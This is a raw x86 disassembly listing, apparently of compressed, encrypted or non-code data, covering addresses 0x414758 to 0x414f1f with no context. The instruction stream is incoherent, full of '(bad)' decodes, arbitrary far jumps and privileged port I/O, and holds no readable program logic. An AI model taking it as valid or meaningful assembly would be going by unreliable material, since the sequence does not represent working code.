  414758:	cmp    BYTE PTR [ecx],al
  41475a:	cmp    edi,DWORD PTR [ebx-0x33]
  41475d:	popf   
  41475e:	or     DWORD PTR [eax-0x6c9d54a],esp
  414764:	jmp    0x896aadc9
  414769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41476a:	dec    esp
  41476b:	je     0x414750
  41476d:	out    0x55,al
  41476f:	cld    
  414770:	sub    al,0xad
  414772:	loope  0x414707
  414774:	mov    ebx,edx
  414776:	outs   dx,DWORD PTR ds:[esi]
  414777:	mov    eax,ds:0x9a72cf60
  41477c:	cs jecxz 0x414762
  41477f:	sbb    eax,0xf803df65
  414784:	es mov dl,bh
  414787:	jmp    0x8c1bd18f
  41478c:	leave  
  41478d:	(bad)  
  41478f:	push   edi
  414790:	ss jbe 0x414721
  414793:	jecxz  0x414756
  414795:	repz sbb eax,0xd91f22d1
  41479b:	and    al,BYTE PTR [ebx-0x6c]
  41479e:	push   edx
  41479f:	or     cl,BYTE PTR [ecx+0x35]
  4147a2:	inc    eax
  4147a3:	mov    bl,0xca
  4147a5:	ret    0x942d
  4147a8:	sahf   
  4147a9:	jmp    0x1a7d:0x68d4d6ba
  4147b0:	rcl    BYTE PTR [ecx],cl
  4147b2:	jge    0x414772
  4147b4:	jno    0x4147af
  4147b6:	test   eax,0xcf25892d
  4147bb:	cmp    eax,0x7c73c5dd
  4147c0:	jmp    0x414825
  4147c2:	mov    ds:0x3576d708,eax
  4147c7:	xchg   BYTE PTR [eax-0x25],ah
  4147ca:	loope  0x414827
  4147cc:	(bad)  
  4147cd:	icebp  
  4147ce:	jbe    0x41482b
  4147d0:	js     0x4147cf
  4147d2:	leave  
  4147d3:	loopne 0x414833
  4147d5:	sar    ecx,1
  4147d7:	xor    eax,0xe1d90d5
  4147dc:	xor    BYTE PTR [ecx+0x4ed43963],bh
  4147e2:	lods   al,BYTE PTR ds:[esi]
  4147e3:	(bad)  
  4147e4:	stc    
  4147e5:	fld    TBYTE PTR [edi]
  4147e7:	mov    dl,0xdf
  4147e9:	and    ecx,esp
  4147eb:	jnp    0x4147b3
  4147ed:	and    BYTE PTR [edx+ebp*8],al
  4147f0:	data16 jno 0x4147ff
  4147f3:	(bad)  
  4147f4:	jnp    0x4147b3
  4147f6:	jp     0x414848
  4147f8:	stos   BYTE PTR es:[edi],al
  4147f9:	mov    ah,0xf
  4147fb:	les    ebp,FWORD PTR [ebx-0x69]
  4147fe:	push   cs
  4147ff:	in     al,0xe6
  414801:	cmp    BYTE PTR [ecx],dh
  414803:	mov    ebp,DWORD PTR [edx-0x6c]
  414806:	adc    al,0x12
  414808:	xor    edi,DWORD PTR [ecx]
  41480a:	fs mov esi,0x3038cb22
  414810:	lock pop esp
  414812:	cdq    
  414813:	inc    edx
  414814:	mov    ds:0x44570317,al
  414819:	dec    eax
  41481a:	adc    eax,0xe42fdb88
  41481f:	pushf  
  414820:	push   ss
  414821:	lods   eax,DWORD PTR ds:[esi]
  414822:	pop    ecx
  414823:	aaa    
  414824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414825:	(bad)  
  414826:	aad    0x8a
  414828:	xor    BYTE PTR [ebx+0x1a460126],bh
  41482e:	inc    edx
  41482f:	(bad)  
  414830:	jmp    0x702e:0xe7ec13ad
  414837:	arpl   WORD PTR [ebx+0x2f4a089d],ax
  41483d:	jecxz  0x4147d0
  41483f:	xor    BYTE PTR [ecx-0x60fd0e46],cl
  414845:	add    cl,BYTE PTR [ebx]
  414847:	add    DWORD PTR [esi],edx
  414849:	aaa    
  41484a:	dec    eax
  41484b:	pop    es
  41484c:	cmp    eax,0xbc1fabae
  414851:	and    bh,ah
  414853:	cmp    eax,0xba99e2cd
  414858:	outs   dx,DWORD PTR ds:[esi]
  414859:	cmp    al,0xf7
  41485b:	pop    ds
  41485c:	and    ch,BYTE PTR [ebx-0x40bc4ef0]
  414862:	clc    
  414863:	(bad)  
  414864:	pushf  
  414865:	cmp    al,0xd6
  414867:	minps  xmm4,XMMWORD PTR [ecx]
  41486a:	sub    eax,0x1ca6912e
  41486f:	sub    bl,cl
  414871:	dec    edx
  414872:	out    0x22,al
  414874:	dec    esi
  414875:	out    0xa7,al
  414877:	and    al,BYTE PTR [eax-0x1c]
  41487a:	sbb    eax,0x2f78fd32
  41487f:	pop    ds
  414880:	cs push 0xcc823e77
  414886:	outs   dx,DWORD PTR ds:[esi]
  414887:	xchg   edx,eax
  414888:	scas   al,BYTE PTR es:[edi]
  414889:	inc    esp
  41488a:	add    BYTE PTR [ebx+0x17],cl
  41488d:	inc    ebp
  41488e:	jmp    0x1c17:0x9f90af23
  414895:	lods   eax,DWORD PTR ds:[esi]
  414896:	fst    QWORD PTR [edi]
  414898:	push   ebx
  414899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41489a:	add    al,0x73
  41489c:	sbb    al,0x9f
  41489e:	mov    DWORD PTR fs:[edx+0x69],ebx
  4148a2:	mov    WORD PTR [ebp+0x3c],cs
  4148a5:	mov    ah,0xb7
  4148a7:	mov    dh,0xba
  4148a9:	out    dx,eax
  4148aa:	fld    QWORD PTR [eax]
  4148ac:	push   cs
  4148ad:	retf   0xa9a6
  4148b0:	inc    eax
  4148b1:	adc    BYTE PTR [esi+0x57],cl
  4148b4:	and    dh,BYTE PTR [ebx+0xa07496c]
  4148ba:	outs   dx,DWORD PTR ds:[esi]
  4148bb:	pop    ecx
  4148bc:	and    ecx,DWORD PTR [ebx+0x1d]
  4148bf:	ficom  DWORD PTR [edi+0x360502c9]
  4148c5:	or     BYTE PTR [edx-0x6e],0x1e
  4148c9:	mov    ch,0x10
  4148cb:	sub    DWORD PTR ss:[edi],ebp
  4148ce:	addr16 xchg ecx,eax
  4148d0:	cs xchg ebp,eax
  4148d2:	stos   DWORD PTR es:[di],eax
  4148d4:	(bad)  
  4148d5:	(bad)  
  4148d6:	sub    DWORD PTR [ebx-0x11de4746],ebx
  4148dc:	mov    DWORD PTR [edi-0x6],esp
  4148df:	loopne 0x414951
  4148e1:	scas   al,BYTE PTR es:[edi]
  4148e2:	pop    esp
  4148e3:	les    esi,FWORD PTR [eax]
  4148e5:	pop    ebp
  4148e6:	repnz (bad)
  4148e9:	and    al,0x8d
  4148eb:	jno    0x4148f1
  4148ed:	rol    DWORD PTR [eax-0x48389c6a],1
  4148f3:	sbb    eax,0x77a74a8
  4148f8:	sbb    eax,0xa806a5f3
  4148fd:	cs fchs 
  414900:	ret    0xa81a
  414903:	or     BYTE PTR ds:0xa4448042,cl
  414909:	into   
  41490a:	jmp    0x414955
  41490c:	mov    al,ds:0x45dd44e1
  414911:	dec    ebx
  414912:	mov    al,ds:0x41679436
  414917:	mov    ah,0x3a
  414919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41491a:	inc    ecx
  41491b:	adc    BYTE PTR [esi+eiz*8-0x70],al
  41491f:	adc    DWORD PTR [ecx+esi*4],ebx
  414922:	cmp    DWORD PTR [ebp+0x66736f74],0x1b
  414929:	popa   
  41492a:	or     eax,0xe4986e14
  41492f:	ficomp DWORD PTR ds:0x63bfd139
  414935:	dec    ebp
  414936:	or     BYTE PTR [edi],dl
  414938:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41493a:	mov    edi,0x54adc84c
  41493f:	lahf   
  414940:	pop    edx
  414941:	test   al,bl
  414943:	ficom  WORD PTR [ebx-0x6c1d1248]
  414949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41494a:	ja     0x41498d
  41494c:	jecxz  0x4148d6
  41494e:	out    0x91,al
  414950:	jnp    0x41491a
  414952:	add    edx,DWORD PTR [eax+0x7e]
  414955:	mov    esp,0x6199eea8
  41495a:	addr16 aas 
  41495c:	xchg   ecx,eax
  41495d:	inc    eax
  41495e:	ror    al,1
  414960:	icebp  
  414961:	sbb    esi,DWORD PTR ds:0xdca5dd53
  414967:	and    ch,ah
  414969:	pop    ebx
  41496a:	mov    esp,0x7981d485
  41496f:	test   al,0x93
  414971:	cli    
  414972:	repnz sub esp,ebp
  414975:	jne    0x4148fb
  414977:	add    ebx,DWORD PTR [ecx]
  414979:	fsub   QWORD PTR [edi-0x73]
  41497c:	leave  
  41497d:	ror    DWORD PTR [esi+0x60eddcf],1
  414983:	xchg   BYTE PTR [edx],ch
  414985:	add    eax,0x7dbed037
  41498a:	sub    BYTE PTR [edi+edi*2-0x6a],0x2c
  41498f:	popf   
  414990:	sub    esi,ebp
  414992:	or     al,0xac
  414994:	cs ret 
  414996:	fneni(8087 only) 
  414998:	daa    
  414999:	inc    edx
  41499a:	cmp    edi,DWORD PTR [edi]
  41499c:	sahf   
  41499d:	icebp  
  41499e:	push   ss
  41499f:	mov    edi,0x7ca18100
  4149a4:	cmp    eax,0xb72c0738
  4149a9:	in     al,0xd6
  4149ab:	aad    0x57
  4149ad:	push   es
  4149ae:	in     eax,dx
  4149af:	mov    ax,0x6124
  4149b3:	daa    
  4149b4:	mov    esi,0x4e9e636e
  4149b9:	clc    
  4149ba:	adc    BYTE PTR [ebp+0x35],ch
  4149bd:	xor    al,0x9f
  4149bf:	pop    ebx
  4149c0:	or     eax,0xddae8944
  4149c5:	jg     0x414a19
  4149c7:	mov    ebx,0xb98833a6
  4149cc:	mov    DWORD PTR [edx-0x75],ecx
  4149cf:	pop    ebx
  4149d0:	neg    DWORD PTR [edi]
  4149d2:	xchg   edx,eax
  4149d3:	sbb    al,0x75
  4149d5:	push   edi
  4149d6:	sti    
  4149d7:	push   0xc764ac38
  4149dc:	nop
  4149dd:	repz xchg esi,eax
  4149df:	fwait
  4149e0:	inc    esi
  4149e1:	mov    eax,ds:0x8313333b
  4149e6:	mov    cl,0x41
  4149e8:	xor    eax,0xfadf9e01
  4149ed:	jns    0x414a3e
  4149ef:	cs pop ds
  4149f1:	add    al,0x86
  4149f3:	xor    eax,0x2b779a17
  4149f8:	js     0x414a33
  4149fa:	lahf   
  4149fb:	adc    al,0xfd
  4149fd:	sbb    eax,0x42522511
  414a02:	jb     0x414a38
  414a04:	not    BYTE PTR [ecx-0x7c]
  414a07:	add    dh,BYTE PTR [ebp+0x5d]
  414a0a:	cmp    cl,BYTE PTR cs:[ebp+0x15]
  414a0e:	pop    es
  414a0f:	inc    ebp
  414a10:	das    
  414a11:	sbb    eax,0x72f2d92f
  414a16:	sti    
  414a17:	push   ss
  414a18:	iret   
  414a19:	and    eax,0x50683cd8
  414a1e:	or     BYTE PTR [ebx+0x73],ch
  414a21:	scas   eax,DWORD PTR es:[edi]
  414a22:	xchg   ebx,eax
  414a23:	pushf  
  414a24:	loop   0x414a92
  414a26:	ins    DWORD PTR es:[edi],dx
  414a27:	cmp    dh,bl
  414a29:	dec    ebx
  414a2a:	outs   dx,DWORD PTR ds:[esi]
  414a2b:	add    DWORD PTR [edi+0x20],ebp
  414a2e:	imul   edx,DWORD PTR [esi+0x4d],0xfa772040
  414a35:	fld    st(6)
  414a37:	adc    al,0x33
  414a39:	test   eax,0x3c92cee0
  414a3e:	push   es
  414a3f:	fld    TBYTE PTR [esi-0x39]
  414a42:	cdq    
  414a43:	dec    ebp
  414a44:	mov    esi,0x2bcbef4f
  414a49:	cmp    esp,DWORD PTR [edx+edx*1-0xc765ba8]
  414a50:	mov    dh,0x33
  414a52:	mov    esi,0x6af4d275
  414a57:	nop
  414a58:	sar    BYTE PTR ds:0xf99c0e0a,cl
  414a5e:	mov    al,ds:0x9bc9a13f
  414a63:	mov    edx,0xb3d8f041
  414a68:	adc    BYTE PTR [ebp+0x2bca859c],bl
  414a6e:	and    ebx,DWORD PTR [ebx-0x7c60615e]
  414a74:	repnz add DWORD PTR [edx+0x1a],edi
  414a78:	xchg   ebx,eax
  414a79:	jmp    0xb22f:0x834df2f1
  414a80:	sub    bh,BYTE PTR [edi]
  414a82:	or     al,0xa
  414a84:	js     0x414a25
  414a86:	mov    ebx,0x369fb2fa
  414a8b:	jo     0x414a19
  414a8d:	bound  ebx,QWORD PTR [ebp+0x6558b58a]
  414a93:	inc    edx
  414a94:	jle    0x414a8a
  414a96:	iret   
  414a97:	push   0x59
  414a99:	push   ecx
  414a9a:	add    ecx,ecx
  414a9c:	sbb    al,0xab
  414a9e:	jmp    0xbede7499
  414aa3:	jmp    0x9bfe53ec
  414aa8:	js     0x414acf
  414aaa:	bsr    edx,DWORD PTR [ecx+0x42]
  414aae:	or     DWORD PTR [esi+0x57],ecx
  414ab1:	cdq    
  414ab2:	push   edx
  414ab3:	add    bl,ch
  414ab5:	xor    ecx,DWORD PTR [ebp-0xc]
  414ab8:	xor    edi,DWORD PTR [eax+0x26]
  414abb:	loope  0x414a92
  414abd:	mov    esi,0x3dccfff6
  414ac2:	inc    edx
  414ac3:	cmc    
  414ac4:	inc    edx
  414ac5:	mov    ds,WORD PTR [edx+esi*2+0x4d]
  414ac9:	xlat   BYTE PTR ds:[ebx]
  414aca:	mov    dl,BYTE PTR [esi-0x39ec8a27]
  414ad0:	sub    BYTE PTR [edx+0x72de262a],cl
  414ad6:	and    edi,DWORD PTR [esi+0x24d0477a]
  414adc:	push   ebp
  414add:	push   cs
  414ade:	fwait
  414adf:	ror    DWORD PTR [edx-0x1e],cl
  414ae2:	out    dx,al
  414ae3:	out    dx,eax
  414ae4:	push   ecx
  414ae5:	leave  
  414ae6:	je     0x414a89
  414ae8:	pop    ecx
  414ae9:	iret   
  414aea:	loopne 0x414b1e
  414aec:	js     0x414ae8
  414aee:	fs in  eax,dx
  414af0:	into   
  414af1:	call   0x8210d14e
  414af6:	sbb    BYTE PTR [ecx-0x3874b24c],bh
  414afc:	(bad)  
  414afd:	or     ch,BYTE PTR [edi+ebp*2]
  414b00:	push   cs
  414b01:	enter  0xf433,0x73
  414b05:	dec    ebx
  414b06:	ins    BYTE PTR es:[edi],dx
  414b07:	and    bl,BYTE PTR [ebx]
  414b09:	stos   DWORD PTR es:[edi],eax
  414b0a:	out    0xc0,eax
  414b0c:	js     0x414ad7
  414b0e:	mov    bh,0x63
  414b10:	pop    ebx
  414b11:	lock enter 0x81b5,0x21
  414b16:	mov    edx,DWORD PTR [edx+0x714d0b6a]
  414b1c:	adc    dl,BYTE PTR [ebx+0x5f]
  414b1f:	jl     0x414b96
  414b21:	mov    ebp,0x2e7fb1de
  414b26:	mov    bl,0x88
  414b28:	dec    edi
  414b29:	fmul   DWORD PTR cs:[edx+eiz*2+0x3a]
  414b2e:	sbb    ah,BYTE PTR [ebx+0x7862c509]
  414b34:	push   0xffffffe1
  414b36:	jecxz  0x414b11
  414b38:	mov    esp,0x586a42ef
  414b3d:	pop    ecx
  414b3e:	dec    esp
  414b3f:	das    
  414b40:	mov    BYTE PTR [ecx-0x3d],dh
  414b43:	jecxz  0x414b99
  414b45:	xchg   BYTE PTR gs:[eax-0x47c93908],cl
  414b4c:	mov    ebp,0x1ff7a0ad
  414b51:	dec    edi
  414b52:	mov    DWORD PTR [eax],eax
  414b54:	cmp    eax,0x39af2b27
  414b59:	cmp    BYTE PTR [ebx],bl
  414b5b:	cwde   
  414b5c:	sti    
  414b5d:	add    DWORD PTR [ecx-0x55],ecx
  414b60:	addr16 mov al,0x51
  414b63:	out    dx,al
  414b64:	push   cs
  414b65:	sub    cl,dl
  414b67:	and    BYTE PTR [ebx+0x6da532db],0xe0
  414b6e:	cli    
  414b6f:	sbb    ecx,esp
  414b71:	mov    ecx,0xd244f11d
  414b76:	rol    BYTE PTR [esi+0x401024d3],0xcb
  414b7d:	push   ds
  414b7e:	pop    edi
  414b7f:	xchg   edi,eax
  414b80:	imul   ebx,DWORD PTR [edi+0x32f4da58],0x0
  414b87:	int3   
  414b88:	(bad)  
  414b89:	push   ebx
  414b8a:	and    edi,ebx
  414b8c:	lods   al,BYTE PTR ds:[esi]
  414b8d:	or     eax,0x53dbdf7d
  414b92:	mov    ebx,0x46a36ea5
  414b97:	jg     0x414c01
  414b99:	int3   
  414b9a:	pop    ds
  414b9b:	pusha  
  414b9c:	adc    eax,ebp
  414b9e:	adc    al,0x26
  414ba0:	ja     0x414b70
  414ba2:	sar    DWORD PTR [esi+ecx*4],0xff
  414ba6:	cli    
  414ba7:	inc    edx
  414ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba9:	mov    ch,0x4e
  414bab:	les    ebp,FWORD PTR [ebx+esi*8-0x70]
  414baf:	sbb    dl,BYTE PTR [ebp+0x5a3190b3]
  414bb5:	xor    ah,BYTE PTR [ebx+0x11]
  414bb8:	cmp    DWORD PTR [esi+0x3b],esp
  414bbb:	outs   dx,BYTE PTR ds:[esi]
  414bbc:	or     DWORD PTR [ebx+0x41481f04],esp
  414bc2:	pop    edx
  414bc3:	mov    ebp,0x2ad55d93
  414bc8:	les    edx,FWORD PTR [esi+0x11c357d0]
  414bce:	jmp    0x414bc6
  414bd0:	adc    ah,BYTE PTR [ecx]
  414bd2:	jmp    0xb3f7:0xea1704a9
  414bd9:	or     al,0xb2
  414bdb:	mov    eax,0xee932971
  414be0:	hlt    
  414be1:	add    DWORD PTR [edx+0x49],ebx
  414be4:	std    
  414be5:	jge    0x414c39
  414be7:	adc    al,0x7b
  414be9:	push   esi
  414bea:	adc    dh,ah
  414bec:	lods   al,BYTE PTR ds:[esi]
  414bed:	loop   0x414b83
  414bef:	in     eax,dx
  414bf0:	out    0xd5,eax
  414bf2:	test   eax,0xa83783ed
  414bf7:	push   ebx
  414bf8:	lods   eax,DWORD PTR ds:[esi]
  414bf9:	fistp  WORD PTR [ecx-0x41]
  414bfc:	mov    ebp,0xf6221d37
  414c01:	cdq    
  414c02:	ds push ebp
  414c04:	cdq    
  414c05:	arpl   WORD PTR [edi],dx
  414c07:	xor    dh,BYTE PTR [edx-0x239e240d]
  414c0d:	repnz dec ebx
  414c0f:	jbe    0x414bc0
  414c11:	add    BYTE PTR [eax],ah
  414c13:	adc    BYTE PTR [edx+0x395b9c02],ah
  414c19:	pop    ss
  414c1a:	push   edx
  414c1b:	push   0xffffffc1
  414c1d:	ret    0x99b0
  414c20:	sbb    edx,DWORD PTR [ecx]
  414c22:	dec    edx
  414c23:	or     eax,DWORD PTR [ebx+0x3b]
  414c26:	fst    DWORD PTR [ebp+0x2247b29f]
  414c2c:	mov    bl,0x8b
  414c2e:	std    
  414c2f:	pop    ecx
  414c30:	xchg   edi,eax
  414c31:	jmp    0x414ca9
  414c33:	in     al,0xe3
  414c35:	mov    edx,0x6af2080b
  414c3a:	out    dx,eax
  414c3b:	popf   
  414c3c:	mov    eax,ds:0x54e8b230
  414c41:	sbb    eax,0x3654674e
  414c46:	cld    
  414c47:	and    eax,0x3f03f4ee
  414c4c:	push   esi
  414c4d:	xchg   edx,eax
  414c4e:	push   ebx
  414c4f:	push   esi
  414c50:	mov    ebx,0x8378efc3
  414c55:	push   ebx
  414c56:	call   FWORD PTR [ecx+0x7090a9e8]
  414c5c:	ficom  DWORD PTR [eax]
  414c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c5f:	mov    gs:0x988baede,al
  414c65:	mov    eax,ds:0x3f7910c9
  414c6a:	pusha  
  414c6b:	data16 add ch,0x26
  414c6f:	mov    ss,WORD PTR [ecx+0x42]
  414c72:	imul   eax,esp,0x47
  414c75:	clc    
  414c76:	clc    
  414c77:	mul    dl
  414c79:	sbb    edx,DWORD PTR [edi-0x4beba334]
  414c7f:	icebp  
  414c80:	aaa    
  414c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c82:	push   esi
  414c83:	imul   esp,edx,0x71
  414c86:	test   eax,0x207f0b6d
  414c8b:	pop    edx
  414c8c:	xor    ebp,esp
  414c8e:	xor    edx,eax
  414c90:	adc    ah,dl
  414c92:	push   edi
  414c93:	sar    ebx,1
  414c95:	dec    edi
  414c96:	xor    eax,0x54645a66
  414c9b:	sar    DWORD PTR [edx],1
  414c9d:	pop    ss
  414c9e:	ret    
  414c9f:	push   esp
  414ca0:	inc    edi
  414ca1:	mov    ebp,0x9f3a3186
  414ca6:	imul   esp,DWORD PTR [ecx+0x6c],0x7c
  414caa:	aad    0x77
  414cac:	dec    ebp
  414cad:	mov    WORD PTR [esi],fs
  414caf:	xor    al,BYTE PTR [ebx]
  414cb1:	mov    ebp,0xf6c2738
  414cb6:	lea    edi,[ebx+ebx*4]
  414cb9:	push   edx
  414cba:	push   esp
  414cbb:	outs   dx,BYTE PTR ds:[esi]
  414cbc:	sub    BYTE PTR [ebp+0x2bce69a7],ch
  414cc2:	xor    dl,cl
  414cc4:	lock aaa 
  414cc6:	jae    0x414d24
  414cc8:	push   eax
  414cc9:	add    DWORD PTR [ecx+0x50fce58a],edi
  414ccf:	pop    ebx
  414cd0:	inc    edx
  414cd1:	push   esp
  414cd2:	mov    al,ds:0x3d288b69
  414cd7:	pop    esi
  414cd8:	mov    esp,0x438758f4
  414cdd:	add    al,0x6a
  414cdf:	in     eax,0x56
  414ce1:	mov    ah,0x30
  414ce3:	stc    
  414ce4:	xchg   DWORD PTR [ebx+0x2d],esi
  414ce7:	dec    ebp
  414ce8:	ds inc esp
  414cea:	xchg   edi,eax
  414ceb:	jle    0x414cd6
  414ced:	or     bh,ah
  414cef:	jne    0x414d16
  414cf1:	sahf   
  414cf2:	aaa    
  414cf3:	fcomp  st(5)
  414cf5:	pop    ecx
  414cf6:	mov    cs,WORD PTR [ecx-0x14]
  414cf9:	mov    ?,WORD PTR [edi+0x7080b37c]
  414cff:	mov    cl,0x66
  414d01:	inc    ecx
  414d02:	cmp    al,0x97
  414d04:	push   ebx
  414d05:	cld    
  414d06:	push   ebx
  414d07:	inc    ebp
  414d08:	dec    ecx
  414d09:	jl     0x414d28
  414d0b:	mov    ebp,edx
  414d0d:	outs   dx,DWORD PTR ds:[esi]
  414d0e:	in     al,0x1b
  414d10:	out    dx,al
  414d11:	(bad)  
  414d13:	xchg   ebx,eax
  414d14:	mov    DWORD PTR [bp+di+0x3e6a],edx
  414d19:	nop
  414d1a:	or     eax,ecx
  414d1c:	stos   BYTE PTR es:[edi],al
  414d1d:	sbb    ebp,DWORD PTR [esp+edx*8+0x5e]
  414d21:	mov    edx,0x9fffdb47
  414d26:	dec    ecx
  414d27:	shr    DWORD PTR [esi+0x2],0x17
  414d2b:	pop    edi
  414d2c:	js     0x414d14
  414d2e:	hlt    
  414d2f:	jg     0x414cf3
  414d31:	xor    cl,BYTE PTR [ecx]
  414d33:	xchg   edi,eax
  414d34:	cmp    esi,DWORD PTR [ebp-0x60543969]
  414d3a:	mov    bh,0x28
  414d3c:	pop    esp
  414d3d:	outs   dx,BYTE PTR ds:[esi]
  414d3e:	inc    esp
  414d3f:	in     eax,dx
  414d40:	and    eax,0xf0982529
  414d45:	xchg   esp,eax
  414d46:	mov    ds:0xb0ceb2fa,al
  414d4b:	aaa    
  414d4c:	dec    ecx
  414d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d4e:	call   0xff43:0x3b426c31
  414d55:	jmp    0x2c7d:0xca3ca92e
  414d5c:	icebp  
  414d5d:	cmc    
  414d5e:	mov    ch,0xec
  414d60:	test   BYTE PTR [ecx-0x53abcdbd],cl
  414d66:	pop    edx
  414d67:	imul   esi,esp,0x45
  414d6a:	sub    BYTE PTR [ecx+0x5c],dh
  414d6d:	add    BYTE PTR [ecx+0x7],bl
  414d70:	push   ds
  414d71:	in     eax,0xe5
  414d73:	push   ebx
  414d74:	in     al,0x51
  414d76:	inc    edi
  414d77:	jae    0x414d09
  414d79:	icebp  
  414d7a:	cmc    
  414d7b:	push   0x4a
  414d7d:	dec    ebp
  414d7e:	mov    ah,0x80
  414d80:	loop   0x414df6
  414d82:	(bad)
  414d85:	leave  
  414d86:	jns    0x414d68
  414d88:	xchg   ecx,eax
  414d89:	(bad)  
  414d8b:	jno    0x414dd4
  414d8d:	or     eax,0xaaf8c0fd
  414d92:	xor    DWORD PTR [edx+edx*4-0x6bbdfbd],ebp
  414d99:	js     0x414dfb
  414d9b:	test   eax,ebx
  414d9d:	aam    0xb7
  414d9f:	clc    
  414da0:	mov    ebp,0xea0ec25f
  414da5:	and    ebx,eax
  414da7:	jecxz  0x414dfa
  414da9:	fs mov bh,0x39
  414dac:	iret   
  414dad:	add    dh,dh
  414daf:	retf   0x6da7
  414db2:	and    DWORD PTR [esi],0x85caa23e
  414db8:	out    0x66,al
  414dba:	adc    DWORD PTR [ecx],eax
  414dbc:	jbe    0x414d9c
  414dbe:	cs nop
  414dc0:	xchg   ebp,eax
  414dc1:	jae    0x414dd9
  414dc3:	dec    esi
  414dc4:	es stc 
  414dc6:	xchg   edi,eax
  414dc7:	sub    esi,ebp
  414dc9:	adc    DWORD PTR [edi+0x21],ebp
  414dcc:	and    ecx,ecx
  414dce:	bnd jle 0x414da3
  414dd1:	rcr    DWORD PTR [edi],0xce
  414dd4:	mov    ebx,0xc6c82db
  414dd9:	sub    ecx,DWORD PTR [ecx-0x28035f3d]
  414ddf:	pop    edi
  414de0:	ret    0x8579
  414de3:	(bad)  
  414de4:	not    DWORD PTR [ecx+0x41]
  414de7:	sub    DWORD PTR [eax-0x2d],ebx
  414dea:	mov    ds:0x1506626b,eax
  414def:	mov    eax,0x8de862e5
  414df4:	fsubr  st,st(4)
  414df6:	call   0x7d8f:0x2434aaa8
  414dfd:	add    dh,ah
  414dff:	jg     0x414dfb
  414e01:	xchg   ebx,eax
  414e02:	retf   0xb1ae
  414e05:	sbb    eax,0x5e162e56
  414e0a:	xchg   ebx,eax
  414e0b:	adc    cl,BYTE PTR [eax]
  414e0d:	(bad)  
  414e0e:	js     0x414e87
  414e10:	inc    esi
  414e11:	pop    eax
  414e12:	push   0x68923a16
  414e17:	mov    ch,0x96
  414e19:	imul   edx,DWORD PTR [ebx+0x26],0xffffffa4
  414e1d:	xor    esi,ebp
  414e1f:	cmp    al,bh
  414e21:	loope  0x414e00
  414e23:	push   esi
  414e24:	pop    eax
  414e25:	stos   DWORD PTR es:[edi],eax
  414e26:	dec    ecx
  414e27:	jae    0x414dbc
  414e29:	rdtsc  
  414e2b:	lahf   
  414e2c:	sti    
  414e2d:	lods   eax,DWORD PTR ds:[esi]
  414e2e:	add    esp,edx
  414e30:	fwait
  414e31:	pop    ss
  414e32:	sub    cl,BYTE PTR [ecx]
  414e34:	loope  0x414e27
  414e36:	imul   esi,ebp,0xffffff9f
  414e39:	nop
  414e3a:	and    BYTE PTR [edx+0x6],al
  414e3d:	les    esi,FWORD PTR [ebp+0x33]
  414e40:	sbb    eax,0x321f4c35
  414e45:	rcr    DWORD PTR [ecx-0x7283f3ac],cl
  414e4b:	and    al,cl
  414e4d:	xor    al,0xd8
  414e4f:	dec    esi
  414e50:	or     eax,0xb3dbc3cd
  414e55:	xor    DWORD PTR [ecx-0x49cb519e],ecx
  414e5b:	xchg   ebp,eax
  414e5c:	loope  0x414ed7
  414e5e:	pusha  
  414e5f:	xchg   esi,eax
  414e60:	add    ebp,eax
  414e62:	and    BYTE PTR [esi-0x31],0x9a
  414e66:	(bad)  
  414e67:	sub    edi,DWORD PTR [esi+0x452067dd]
  414e6d:	cmp    BYTE PTR [ebx],bl
  414e6f:	inc    ecx
  414e70:	lods   eax,DWORD PTR ds:[esi]
  414e71:	sub    DWORD PTR [edi+0x2e939262],ebx
  414e77:	call   FWORD PTR [eax-0x7a16f5c6]
  414e7d:	fnstenv [ebp-0x69f39d22]
  414e83:	repz push ds
  414e85:	push   0x20
  414e87:	sbb    edi,DWORD PTR [esi+0x78]
  414e8a:	stos   DWORD PTR es:[edi],eax
  414e8b:	sub    DWORD PTR [ecx-0x76fa3188],0xffffffe2
  414e92:	rol    BYTE PTR [ecx-0x19],cl
  414e95:	pop    esp
  414e96:	cmp    dl,BYTE PTR [eax-0x595c4d06]
  414e9c:	push   esp
  414e9d:	dec    esp
  414e9e:	and    eax,0x45d85a7b
  414ea3:	push   esi
  414ea4:	jle    0x414e9c
  414ea6:	enter  0xdcf7,0xa4
  414eaa:	mov    edi,ebx
  414eac:	mov    bl,0x11
  414eae:	mov    ah,0xa7
  414eb0:	mov    eax,0xdd79263e
  414eb5:	retf   0x4159
  414eb8:	xor    ch,BYTE PTR [edi]
  414eba:	adc    DWORD PTR [edi],esi
  414ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ebd:	aad    0xa4
  414ebf:	out    dx,eax
  414ec0:	sar    eax,1
  414ec2:	pop    esp
  414ec3:	inc    edi
  414ec4:	xor    eax,0x7832f8d6
  414ec9:	or     ecx,DWORD PTR [edx+0x79]
  414ecc:	test   eax,0x7521b02a
  414ed1:	popf   
  414ed2:	pop    esi
  414ed3:	dec    DWORD PTR ds:0xfe098a4a
  414ed9:	push   ebp
  414eda:	cmp    eax,DWORD PTR [esi]
  414edc:	ja     0x414e96
  414ede:	gs push eax
  414ee0:	pop    es
  414ee1:	shl    BYTE PTR [esi+0x6878d484],1
  414ee7:	imul   edx,ebp,0x52
  414eea:	mov    DWORD PTR [edi],esp
  414eec:	or     eax,0xa9ae1dd5
  414ef1:	adc    al,0xa5
  414ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ef4:	rcr    BYTE PTR [esi],0x67
  414ef7:	sub    cl,BYTE PTR [edi]
  414ef9:	scas   eax,DWORD PTR es:[edi]
  414efa:	in     eax,0xb
  414efc:	cmp    bh,al
  414efe:	jmp    FWORD PTR [esi]
  414f00:	mov    edi,0x805c6318
  414f05:	nop
  414f06:	idiv   WORD PTR [ebp+0x6bab9a24]
  414f0d:	in     eax,0xe2
  414f0f:	cmc    
  414f10:	(bad)  
  414f11:	ss pop esi
  414f13:	adc    eax,0x4b2b0f17
  414f18:	call   0x161:0x173c2993
  414f1f:	out    0x36,eax
